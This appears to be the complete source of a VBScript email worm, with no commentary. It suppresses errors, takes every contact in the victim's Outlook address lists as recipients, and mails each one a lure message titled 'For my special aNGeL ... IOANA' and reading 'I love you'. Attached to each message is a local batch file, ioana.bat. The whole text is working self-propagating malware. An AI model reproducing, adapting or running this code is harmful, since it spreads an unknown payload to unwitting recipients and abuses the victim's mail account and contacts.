on error resume next
dim a,b,c,d,e
set a = Wscript.CreateObject("Wscript.Shell")
set b = CreateObject("Outlook.Application")
set c = b.GetNameSpace("MAPI")
for y = 1 To c.AddressLists.Count
set d = c.AddressLists(y)
x = 1
set e = b.CreateItem(0)
for o = 1 To d.AddressEntries.Count
f = d.AddressEntries(x)
e.Recipients.Add f
x = x + 1
next
e.Subject = " For my special aNGeL ... IOANA ... "
e.Body = " I love you "
e.Attachments.Add ("c:\windows\system\ioana\ioana.bat")
e.DeleteAfterSubmit = False
e.Send
f = ""
next
